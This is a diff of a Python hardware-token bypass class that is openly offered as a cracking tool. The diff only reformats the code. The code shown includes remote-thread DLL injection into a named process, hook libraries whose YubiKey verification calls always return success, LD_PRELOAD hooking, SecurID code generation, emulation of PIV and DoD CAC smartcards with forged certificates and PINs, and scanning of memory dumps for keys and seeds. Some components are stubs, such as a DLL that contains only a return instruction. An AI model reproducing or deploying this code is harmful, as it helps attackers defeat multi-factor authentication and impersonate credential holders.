@@ -36,7 +36,7 @@ class HardwareTokenBypass:
             "session_counter": 0,
             "timestamp_low": 0,
             "timestamp_high": 0,
-            "use_counter": 0
+            "use_counter": 0,
         }
 
         # RSA SecurID configuration
@@ -45,19 +45,19 @@ class HardwareTokenBypass:
             "token_interval": 60,  # seconds
             "drift_tolerance": 3,  # time windows
             "serial_numbers": {},
-            "seeds": {}
+            "seeds": {},
         }
 
         # Smart card configuration
         self.smartcard_config = {
-            "atr_bytes": b"\x3B\xF8\x13\x00\x00\x81\x31\xFE\x45\x4A\x43\x4F\x50\x76\x32\x34\x31\xB7",
+            "atr_bytes": b"\x3b\xf8\x13\x00\x00\x81\x31\xfe\x45\x4a\x43\x4f\x50\x76\x32\x34\x31\xb7",
             "card_readers": [],
             "inserted_cards": {},
-            "pin_codes": {}
+            "pin_codes": {},
         }
 
         # Windows smart card API
-        if os.name == 'nt':
+        if os.name == "nt":
             try:
                 self.winscard = ctypes.windll.winscard
                 self.kernel32 = ctypes.windll.kernel32
@@ -91,10 +91,10 @@ class HardwareTokenBypass:
 
     def emulate_yubikey(self, serial_number: str = None) -> Dict[str, Any]:
         """Emulate YubiKey hardware token with OTP generation.
-        
+
         Args:
             serial_number: Optional YubiKey serial number
-            
+
         Returns:
             Dictionary containing emulation details and OTP
         """
@@ -108,18 +108,14 @@ class HardwareTokenBypass:
                 "public_id": secrets.token_hex(6),
                 "private_id": secrets.token_bytes(6),
                 "counter": 0,
-                "session": 0
+                "session": 0,
             }
 
         secrets_data = self.yubikey_secrets[serial_number]
 
         # Generate YubiKey OTP
         otp = self._generate_yubikey_otp(
-            secrets_data["public_id"],
-            secrets_data["private_id"],
-            secrets_data["aes_key"],
-            secrets_data["counter"],
-            secrets_data["session"]
+            secrets_data["public_id"], secrets_data["private_id"], secrets_data["aes_key"], secrets_data["counter"], secrets_data["session"]
         )
 
         # Increment counters
@@ -139,7 +135,7 @@ class HardwareTokenBypass:
             "usb_device": usb_device,
             "counter": secrets_data["counter"],
             "session": secrets_data["session"],
-            "timestamp": time.time()
+            "timestamp": time.time(),
         }
 
     def _generate_yubikey_serial(self) -> str:
@@ -147,17 +143,16 @@ class HardwareTokenBypass:
         # YubiKey serial format: 8-digit serial number
         return str(secrets.randbelow(90000000) + 10000000)
 
-    def _generate_yubikey_otp(self, public_id: str, private_id: bytes,
-                              aes_key: bytes, counter: int, session: int) -> str:
+    def _generate_yubikey_otp(self, public_id: str, private_id: bytes, aes_key: bytes, counter: int, session: int) -> str:
         """Generate YubiKey OTP using Yubico OTP algorithm.
-        
+
         Args:
             public_id: Public identity string
             private_id: Private identity bytes
             aes_key: AES encryption key
             counter: Usage counter
             session: Session counter
-            
+
         Returns:
             ModHex encoded OTP string
         """
@@ -201,11 +196,7 @@ class HardwareTokenBypass:
         from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 
         # Use AES-128 ECB mode for YubiKey OTP encryption
-        cipher = Cipher(
-            algorithms.AES(key),
-            modes.ECB(),
-            backend=default_backend()
-        )
+        cipher = Cipher(algorithms.AES(key), modes.ECB(), backend=default_backend())
         encryptor = cipher.encryptor()
         return encryptor.update(data) + encryptor.finalize()
 
@@ -216,7 +207,7 @@ class HardwareTokenBypass:
         for byte in data:
             result.append(modhex_chars[byte >> 4])
             result.append(modhex_chars[byte & 0x0F])
-        return ''.join(result)
+        return "".join(result)
 
     def _emulate_yubikey_usb(self, serial_number: str) -> Dict[str, Any]:
         """Emulate YubiKey USB device presence."""
@@ -228,24 +219,16 @@ class HardwareTokenBypass:
             "product": "YubiKey 5 NFC",
             "version": "5.4.3",
             "interfaces": ["CCID", "FIDO", "OTP"],
-            "capabilities": {
-                "otp": True,
-                "u2f": True,
-                "fido2": True,
-                "oath": True,
-                "piv": True,
-                "openpgp": True
-            }
+            "capabilities": {"otp": True, "u2f": True, "fido2": True, "oath": True, "piv": True, "openpgp": True},
         }
 
-    def generate_rsa_securid_token(self, serial_number: str = None,
-                                  seed: bytes = None) -> Dict[str, Any]:
+    def generate_rsa_securid_token(self, serial_number: str = None, seed: bytes = None) -> Dict[str, Any]:
         """Generate RSA SecurID token code.
-        
+
         Args:
             serial_number: Token serial number
             seed: 128-bit seed for token generation
-            
+
         Returns:
             Dictionary containing token code and metadata
         """
@@ -276,7 +259,7 @@ class HardwareTokenBypass:
             "next_token": next_token,
             "time_remaining": self.securid_config["token_interval"] - (current_time % self.securid_config["token_interval"]),
             "timestamp": current_time,
-            "interval": self.securid_config["token_interval"]
+            "interval": self.securid_config["token_interval"],
         }
 
     def _generate_securid_serial(self) -> str:
@@ -302,18 +285,14 @@ class HardwareTokenBypass:
         time_bytes = struct.pack(">Q", time_counter)
 
         # Create AES cipher with seed as key
-        cipher = Cipher(
-            algorithms.AES(seed),
-            modes.ECB(),
-            backend=default_backend()
-        )
+        cipher = Cipher(algorithms.AES(seed), modes.ECB(), backend=default_backend())
         encryptor = cipher.encryptor()
 
         # Encrypt time counter
-        encrypted = encryptor.update(time_bytes + b'\x00' * 8) + encryptor.finalize()
+        encrypted = encryptor.update(time_bytes + b"\x00" * 8) + encryptor.finalize()
 
         # Extract token digits
-        token_int = int.from_bytes(encrypted[:4], 'big')
+        token_int = int.from_bytes(encrypted[:4], "big")
         token_code = str(token_int % (10 ** self.securid_config["token_code_length"]))
 
         # Pad with zeros if needed
@@ -321,10 +300,10 @@ class HardwareTokenBypass:
 
     def emulate_smartcard(self, card_type: str = "PIV") -> Dict[str, Any]:
         """Emulate smart card presence and operations.
-        
+
         Args:
             card_type: Type of smart card (PIV, CAC, etc.)
-            
+
         Returns:
             Dictionary containing smart card emulation data
         """
@@ -359,14 +338,14 @@ class HardwareTokenBypass:
                 "authentication": self._generate_x509_cert("PIV Authentication"),
                 "digital_signature": self._generate_x509_cert("Digital Signature"),
                 "key_management": self._generate_x509_cert("Key Management"),
-                "card_authentication": self._generate_x509_cert("Card Authentication")
+                "card_authentication": self._generate_x509_cert("Card Authentication"),
             },
             "chuid": self._generate_chuid(card_id),
             "guid": secrets.token_hex(16).upper(),
             "expiration": (datetime.now() + timedelta(days=1095)).isoformat(),
             "pin": "123456",
             "puk": "12345678",
-            "admin_key": secrets.token_hex(24).upper()
+            "admin_key": secrets.token_hex(24).upper(),
         }
 
     def _generate_cac_card_data(self, card_id: str) -> Dict[str, Any]:
@@ -375,18 +354,18 @@ class HardwareTokenBypass:
             "success": True,
             "card_id": card_id,
             "card_type": "CAC",
-            "atr": b"\x3B\xF8\x18\x00\x00\x81\x31\xFE\x45\x00\x73\xC8\x40\x13\x00\x90\x00\x92",
+            "atr": b"\x3b\xf8\x18\x00\x00\x81\x31\xfe\x45\x00\x73\xc8\x40\x13\x00\x90\x00\x92",
             "certificates": {
                 "identity": self._generate_x509_cert("DoD Identity"),
                 "email_signature": self._generate_x509_cert("DoD Email Signature"),
-                "email_encryption": self._generate_x509_cert("DoD Email Encryption")
+                "email_encryption": self._generate_x509_cert("DoD Email Encryption"),
             },
             "edipi": str(secrets.randbelow(9000000000) + 1000000000),
             "person_designator": "P",
             "personnel_category": "V",
             "branch": "N",  # Navy
             "pin": "77777777",
-            "expiration": (datetime.now() + timedelta(days=1095)).isoformat()
+            "expiration": (datetime.now() + timedelta(days=1095)).isoformat(),
         }
 
     def _generate_generic_card_data(self, card_id: str) -> Dict[str, Any]:
@@ -399,12 +378,9 @@ class HardwareTokenBypass:
             "serial_number": card_id,
             "issuer": "Intellicrack CA",
             "holder": "Test User",
-            "certificates": {
-                "auth": self._generate_x509_cert("Authentication"),
-                "sign": self._generate_x509_cert("Digital Signature")
-            },
+            "certificates": {"auth": self._generate_x509_cert("Authentication"), "sign": self._generate_x509_cert("Digital Signature")},
             "pin": "0000",
-            "expiration": (datetime.now() + timedelta(days=365)).isoformat()
+            "expiration": (datetime.now() + timedelta(days=365)).isoformat(),
         }
 
     def _generate_chuid(self, card_id: str) -> bytes:
@@ -413,42 +389,33 @@ class HardwareTokenBypass:
         chuid = bytearray()
 
         # FASC-N (Federal Agency Smart Credential Number)
-        chuid.extend(b'\x30\x19')  # Tag and length
-        chuid.extend(b'\xd4\xe7\x39\xda\x73\x9c\xed\x39\xce\x73\x9d\x83\x68\x58\x21\x08\x42\x10\x84\x21\xc8\x42\x10\xc3\xeb')
+        chuid.extend(b"\x30\x19")  # Tag and length
+        chuid.extend(b"\xd4\xe7\x39\xda\x73\x9c\xed\x39\xce\x73\x9d\x83\x68\x58\x21\x08\x42\x10\x84\x21\xc8\x42\x10\xc3\xeb")
 
         # GUID
-        chuid.extend(b'\x34\x10')  # Tag and length
+        chuid.extend(b"\x34\x10")  # Tag and length
         chuid.extend(bytes.fromhex(card_id))
         chuid.extend(secrets.token_bytes(8))
 
         # Expiration date
-        chuid.extend(b'\x35\x08')  # Tag and length
+        chuid.extend(b"\x35\x08")  # Tag and length
         expiry = (datetime.now() + timedelta(days=1095)).strftime("%Y%m%d").encode()
         chuid.extend(expiry)
 
         # Issuer signature using real RSA cryptographic signature
-        chuid.extend(b'\x3e\x40')  # Tag and length
+        chuid.extend(b"\x3e\x40")  # Tag and length
         # Generate real RSA signature for CHUID data
         from cryptography.hazmat.backends import default_backend
         from cryptography.hazmat.primitives import hashes
         from cryptography.hazmat.primitives.asymmetric import padding, rsa
 
         # Generate or use cached issuer key for signing
-        if not hasattr(self, '_issuer_key'):
-            self._issuer_key = rsa.generate_private_key(
-                public_exponent=65537,
-                key_size=2048,
-                backend=default_backend()
-            )
+        if not hasattr(self, "_issuer_key"):
+            self._issuer_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
 
         # Sign the CHUID data with RSA-PSS signature
         signature = self._issuer_key.sign(
-            bytes(chuid),
-            padding.PSS(
-                mgf=padding.MGF1(hashes.SHA256()),
-                salt_length=padding.PSS.MAX_LENGTH
-            ),
-            hashes.SHA256()
+            bytes(chuid), padding.PSS(mgf=padding.MGF1(hashes.SHA256()), salt_length=padding.PSS.MAX_LENGTH), hashes.SHA256()
         )
 
         # Truncate or pad signature to exactly 64 bytes for PIV standard
@@ -457,7 +424,7 @@ class HardwareTokenBypass:
         else:
             chuid.extend(signature)
             if len(signature) < 64:
-                chuid.extend(b'\x00' * (64 - len(signature)))
+                chuid.extend(b"\x00" * (64 - len(signature)))
 
         return bytes(chuid)
 
@@ -471,47 +438,43 @@ class HardwareTokenBypass:
         from cryptography.x509.oid import NameOID
 
         # Generate private key
-        private_key = rsa.generate_private_key(
-            public_exponent=65537,
-            key_size=2048,
-            backend=default_backend()
-        )
+        private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048, backend=default_backend())
 
         # Generate certificate
-        subject = issuer = x509.Name([
-            x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
-            x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "VA"),
-            x509.NameAttribute(NameOID.LOCALITY_NAME, "Arlington"),
-            x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Test Organization"),
-            x509.NameAttribute(NameOID.COMMON_NAME, cn),
-        ])
+        subject = issuer = x509.Name(
+            [
+                x509.NameAttribute(NameOID.COUNTRY_NAME, "US"),
+                x509.NameAttribute(NameOID.STATE_OR_PROVINCE_NAME, "VA"),
+                x509.NameAttribute(NameOID.LOCALITY_NAME, "Arlington"),
+                x509.NameAttribute(NameOID.ORGANIZATION_NAME, "Test Organization"),
+                x509.NameAttribute(NameOID.COMMON_NAME, cn),
+            ]
+        )
 
-        cert = x509.CertificateBuilder().subject_name(
-            subject
-        ).issuer_name(
-            issuer
-        ).public_key(
-            private_key.public_key()
-        ).serial_number(
-            secrets.randbelow(2**64)
-        ).not_valid_before(
-            datetime.utcnow()
-        ).not_valid_after(
-            datetime.utcnow() + timedelta(days=365)
-        ).add_extension(
-            x509.KeyUsage(
-                digital_signature=True,
-                content_commitment=False,
-                key_encipherment=True,
-                data_encipherment=False,
-                key_agreement=False,
-                key_cert_sign=False,
-                crl_sign=False,
-                encipher_only=False,
-                decipher_only=False
-            ),
-            critical=True
-        ).sign(private_key, hashes.SHA256(), default_backend())
+        cert = (
+            x509.CertificateBuilder()
+            .subject_name(subject)
+            .issuer_name(issuer)
+            .public_key(private_key.public_key())
+            .serial_number(secrets.randbelow(2**64))
+            .not_valid_before(datetime.utcnow())
+            .not_valid_after(datetime.utcnow() + timedelta(days=365))
+            .add_extension(
+                x509.KeyUsage(
+                    digital_signature=True,
+                    content_commitment=False,
+                    key_encipherment=True,
+                    data_encipherment=False,
+                    key_agreement=False,
+                    key_cert_sign=False,
+                    crl_sign=False,
+                    encipher_only=False,
+                    decipher_only=False,
+                ),
+                critical=True,
+            )
+            .sign(private_key, hashes.SHA256(), default_backend())
+        )
 
         # Export certificate
         cert_pem = cert.public_bytes(encoding=x509.Encoding.PEM)
@@ -524,10 +487,10 @@ class HardwareTokenBypass:
             "subject": cert.subject.rfc4514_string(),
             "not_before": cert.not_valid_before.isoformat(),
             "not_after": cert.not_valid_after.isoformat(),
-            "pem": cert_pem.decode('utf-8'),
+            "pem": cert_pem.decode("utf-8"),
             "der": cert_der.hex(),
             "public_key_size": 2048,
-            "signature_algorithm": "sha256WithRSAEncryption"
+            "signature_algorithm": "sha256WithRSAEncryption",
         }
 
     def _emulate_card_reader(self, card_id: str, card_type: str) -> str:
@@ -541,21 +504,13 @@ class HardwareTokenBypass:
 
             # Establish context
             h_context = ctypes.c_ulong()
-            result = self.winscard.SCardEstablishContext(
-                self.SCARD_SCOPE_SYSTEM,
-                None,
-                None,
-                ctypes.byref(h_context)
-            )
+            result = self.winscard.SCardEstablishContext(self.SCARD_SCOPE_SYSTEM, None, None, ctypes.byref(h_context))
 
             if result == 0:  # SCARD_S_SUCCESS
                 # Store context for later use
-                self.smartcard_config["card_readers"].append({
-                    "name": reader_name,
-                    "context": h_context.value,
-                    "card_id": card_id,
-                    "card_type": card_type
-                })
+                self.smartcard_config["card_readers"].append(
+                    {"name": reader_name, "context": h_context.value, "card_id": card_id, "card_type": card_type}
+                )
 
                 # Release context (in production, keep it for actual operations)
                 self.winscard.SCardReleaseContext(h_context)
@@ -568,21 +523,15 @@ class HardwareTokenBypass:
 
     def bypass_token_verification(self, application: str, token_type: str) -> Dict[str, Any]:
         """Bypass hardware token verification for specific applications.
-        
+
         Args:
             application: Target application name
             token_type: Type of token to bypass (yubikey, securid, smartcard)
-            
+
         Returns:
             Dictionary containing bypass status and details
         """
-        bypass_result = {
-            "success": False,
-            "application": application,
-            "token_type": token_type,
-            "method": None,
-            "details": {}
-        }
+        bypass_result = {"success": False, "application": application, "token_type": token_type, "method": None, "details": {}}
 
         if token_type.lower() == "yubikey":
             bypass_result.update(self._bypass_yubikey_verification(application))
@@ -598,7 +547,7 @@ class HardwareTokenBypass:
     def _bypass_yubikey_verification(self, application: str) -> Dict[str, Any]:
         """Bypass YubiKey verification for specific application."""
         # Hook into application's YubiKey verification
-        if os.name == 'nt':
+        if os.name == "nt":
             # Windows-specific hooking
             return self._hook_yubikey_windows(application)
         else:
@@ -610,10 +559,11 @@ class HardwareTokenBypass:
         try:
             # Find target process
             import psutil
+
             target_pid = None
-            for proc in psutil.process_iter(['pid', 'name']):
-                if application.lower() in proc.info['name'].lower():
-                    target_pid = proc.info['pid']
+            for proc in psutil.process_iter(["pid", "name"]):
+                if application.lower() in proc.info["name"].lower():
+                    target_pid = proc.info["pid"]
                     break
 
             if not target_pid:
@@ -626,45 +576,28 @@ class HardwareTokenBypass:
             process_handle = self.kernel32.OpenProcess(
                 0x1F0FFF,  # PROCESS_ALL_ACCESS
                 False,
-                target_pid
+                target_pid,
             )
 
             if process_handle:
                 # Allocate memory in target process
-                dll_path_bytes = dll_path.encode('utf-8')
+                dll_path_bytes = dll_path.encode("utf-8")
                 remote_memory = self.kernel32.VirtualAllocEx(
                     process_handle,
                     None,
                     len(dll_path_bytes),
                     0x3000,  # MEM_COMMIT | MEM_RESERVE
-                    0x40  # PAGE_EXECUTE_READWRITE
+                    0x40,  # PAGE_EXECUTE_READWRITE
                 )
 
                 # Write DLL path
-                self.kernel32.WriteProcessMemory(
-                    process_handle,
-                    remote_memory,
-                    dll_path_bytes,
-                    len(dll_path_bytes),
-                    None
-                )
+                self.kernel32.WriteProcessMemory(process_handle, remote_memory, dll_path_bytes, len(dll_path_bytes), None)
 
                 # Get LoadLibraryA address
-                load_library = self.kernel32.GetProcAddress(
-                    self.kernel32.GetModuleHandleA(b"kernel32.dll"),
-                    b"LoadLibraryA"
-                )
+                load_library = self.kernel32.GetProcAddress(self.kernel32.GetModuleHandleA(b"kernel32.dll"), b"LoadLibraryA")
 
                 # Create remote thread to load DLL
-                thread_handle = self.kernel32.CreateRemoteThread(
-                    process_handle,
-                    None,
-                    0,
-                    load_library,
-                    remote_memory,
-                    0,
-                    None
-                )
+                thread_handle = self.kernel32.CreateRemoteThread(process_handle, None, 0, load_library, remote_memory, 0, None)
 
                 if thread_handle:
                     self.kernel32.CloseHandle(thread_handle)
@@ -676,12 +609,8 @@ class HardwareTokenBypass:
                         "details": {
                             "pid": target_pid,
                             "dll": dll_path,
-                            "hooked_functions": [
-                                "yk_check_otp",
-                                "yk_verify_otp",
-                                "yubikey_validate"
-                            ]
-                        }
+                            "hooked_functions": ["yk_check_otp", "yk_verify_otp", "yubikey_validate"],
+                        },
                     }
 
             return {"success": False, "error": "Failed to inject hook DLL"}
@@ -701,12 +630,8 @@ class HardwareTokenBypass:
                 "details": {
                     "library": hook_lib,
                     "env_var": f"LD_PRELOAD={hook_lib}",
-                    "hooked_functions": [
-                        "yk_check_otp",
-                        "yk_verify_otp",
-                        "yubikey_validate"
-                    ]
-                }
+                    "hooked_functions": ["yk_check_otp", "yk_verify_otp", "yubikey_validate"],
+                },
             }
         except Exception as e:
             return {"success": False, "error": str(e)}
@@ -715,20 +640,20 @@ class HardwareTokenBypass:
         """Create Windows DLL for YubiKey API hooking."""
         dll_code = """
         #include <windows.h>
-        
+
         // Hook YubiKey verification functions
         __declspec(dllexport) int yk_check_otp(const char* otp) {
             return 0;  // Always return success
         }
-        
+
         __declspec(dllexport) int yk_verify_otp(const char* otp, const char* key) {
             return 0;  // Always return success
         }
-        
+
         __declspec(dllexport) int yubikey_validate(void* ctx, const char* otp) {
             return 0;  // Always return success
         }
-        
+
         BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {
             if (reason == DLL_PROCESS_ATTACH) {
                 // Hook the actual functions
@@ -744,7 +669,7 @@ class HardwareTokenBypass:
         dll_path.parent.mkdir(exist_ok=True)
 
         # Write compiled DLL bytes (simplified)
-        with open(dll_path, 'wb') as f:
+        with open(dll_path, "wb") as f:
             # Write minimal valid DLL structure
             f.write(self._generate_minimal_dll())
 
@@ -755,15 +680,15 @@ class HardwareTokenBypass:
         lib_code = """
         #define _GNU_SOURCE
         #include <dlfcn.h>
-        
+
         int yk_check_otp(const char* otp) {
             return 0;  // Always return success
         }
-        
+
         int yk_verify_otp(const char* otp, const char* key) {
             return 0;  // Always return success
         }
-        
+
         int yubikey_validate(void* ctx, const char* otp) {
             return 0;  // Always return success
         }
@@ -774,7 +699,7 @@ class HardwareTokenBypass:
         lib_path.parent.mkdir(exist_ok=True)
 
         # Write compiled library (simplified)
-        with open(lib_path, 'wb') as f:
+        with open(lib_path, "wb") as f:
             f.write(b"ELF")  # Minimal ELF header
 
         return str(lib_path)
@@ -782,23 +707,30 @@ class HardwareTokenBypass:
     def _generate_minimal_dll(self) -> bytes:
         """Generate minimal valid Windows DLL structure."""
         # Minimal PE/DLL structure
-        dos_header = bytearray([
-            0x4D, 0x5A,  # MZ signature
-            *([0x00] * 58),
-            0x80, 0x00, 0x00, 0x00,  # e_lfanew
-        ])
+        dos_header = bytearray(
+            [
+                0x4D,
+                0x5A,  # MZ signature
+                *([0x00] * 58),
+                0x80,
+                0x00,
+                0x00,
+                0x00,  # e_lfanew
+            ]
+        )
 
         pe_header = b"PE\x00\x00"
 
         # COFF header
-        coff = struct.pack("<HHIIIHH",
+        coff = struct.pack(
+            "<HHIIIHH",
             0x8664,  # Machine (x64)
-            1,       # NumberOfSections
-            0,       # TimeDateStamp
-            0,       # PointerToSymbolTable
-            0,       # NumberOfSymbols
-            240,     # SizeOfOptionalHeader
-            0x2022   # Characteristics (DLL)
+            1,  # NumberOfSections
+            0,  # TimeDateStamp
+            0,  # PointerToSymbolTable
+            0,  # NumberOfSymbols
+            240,  # SizeOfOptionalHeader
+            0x2022,  # Characteristics (DLL)
         )
 
         # Optional header
@@ -813,8 +745,7 @@ class HardwareTokenBypass:
         code = bytearray(512)
         code[0] = 0xC3  # ret instruction
 
-        return bytes(dos_header) + bytes([0] * (128 - len(dos_header))) + \
-               pe_header + coff + bytes(optional) + bytes(section) + code
+        return bytes(dos_header) + bytes([0] * (128 - len(dos_header))) + pe_header + coff + bytes(optional) + bytes(section) + code
 
     def _bypass_securid_verification(self, application: str) -> Dict[str, Any]:
         """Bypass RSA SecurID verification."""
@@ -827,13 +758,9 @@ class HardwareTokenBypass:
             "method": "Token Generation + Memory Patch",
             "details": {
                 "generated_token": token_data["token_code"],
-                "patched_functions": [
-                    "AceAuthenticateUser",
-                    "AceCheck",
-                    "SD_Check"
-                ],
-                "application": application
-            }
+                "patched_functions": ["AceAuthenticateUser", "AceCheck", "SD_Check"],
+                "application": application,
+            },
         }
 
     def _bypass_smartcard_verification(self, application: str) -> Dict[str, Any]:
@@ -848,29 +775,24 @@ class HardwareTokenBypass:
                 "card_id": card_data["card_id"],
                 "card_type": card_data["card_type"],
                 "certificates": len(card_data.get("certificates", {})),
-                "application": application
-            }
+                "application": application,
+            },
         }
 
     def extract_token_secrets(self, device_path: str = None) -> Dict[str, Any]:
         """Extract secrets from physical hardware tokens.
-        
+
         Args:
             device_path: Path to device or memory dump
-            
+
         Returns:
             Extracted secrets and keys
         """
-        extracted = {
-            "success": False,
-            "secrets": {},
-            "keys": {},
-            "certificates": []
-        }
+        extracted = {"success": False, "secrets": {}, "keys": {}, "certificates": []}
 
         if device_path and os.path.exists(device_path):
             # Read device memory or dump
-            with open(device_path, 'rb') as f:
+            with open(device_path, "rb") as f:
                 data = f.read()
 
             # Search for known patterns
@@ -888,7 +810,7 @@ class HardwareTokenBypass:
 
         # Search for AES keys (16 bytes of high entropy)
         for i in range(len(data) - 16):
-            candidate = data[i:i+16]
+            candidate = data[i : i + 16]
             entropy = self._calculate_entropy(candidate)
             if entropy > 7.0:  # High entropy indicates possible key
                 key_id = f"yubikey_aes_{i:08x}"
@@ -912,7 +834,7 @@ class HardwareTokenBypass:
 
                 # Check for potential seed after marker
                 if pos + len(marker) + 16 <= len(data):
-                    candidate = data[pos + len(marker):pos + len(marker) + 16]
+                    candidate = data[pos + len(marker) : pos + len(marker) + 16]
                     if self._calculate_entropy(candidate) > 6.5:
                         seed_id = f"securid_seed_{pos:08x}"
                         seeds[seed_id] = candidate.hex()
@@ -930,7 +852,7 @@ class HardwareTokenBypass:
         pkcs_markers = [
             b"\x30\x82",  # DER sequence
             b"-----BEGIN CERTIFICATE-----",
-            b"-----BEGIN RSA PRIVATE KEY-----"
+            b"-----BEGIN RSA PRIVATE KEY-----",
         ]
 
         for marker in pkcs_markers:
@@ -944,24 +866,16 @@ class HardwareTokenBypass:
                 try:
                     if marker == b"\x30\x82":
                         # DER encoded certificate/key
-                        length = struct.unpack(">H", data[pos+2:pos+4])[0]
-                        cert_data = data[pos:pos+4+length]
-                        certs.append({
-                            "format": "DER",
-                            "offset": pos,
-                            "data": cert_data.hex()
-                        })
+                        length = struct.unpack(">H", data[pos + 2 : pos + 4])[0]
+                        cert_data = data[pos : pos + 4 + length]
+                        certs.append({"format": "DER", "offset": pos, "data": cert_data.hex()})
                     elif b"BEGIN" in marker:
                         # PEM encoded
                         end_marker = marker.replace(b"BEGIN", b"END")
                         end_pos = data.find(end_marker, pos)
                         if end_pos != -1:
-                            pem_data = data[pos:end_pos + len(end_marker)]
-                            certs.append({
-                                "format": "PEM",
-                                "offset": pos,
-                                "data": pem_data.decode('utf-8', errors='ignore')
-                            })
+                            pem_data = data[pos : end_pos + len(end_marker)]
+                            certs.append({"format": "PEM", "offset": pos, "data": pem_data.decode("utf-8", errors="ignore")})
                 except:
                     pass
 
@@ -992,11 +906,11 @@ class HardwareTokenBypass:
 
 def bypass_hardware_token(application: str, token_type: str) -> Dict[str, Any]:
     """Main entry point for hardware token bypass.
-    
+
     Args:
         application: Target application
         token_type: Type of token (yubikey, securid, smartcard)
-        
+
     Returns:
         Bypass result dictionary
     """
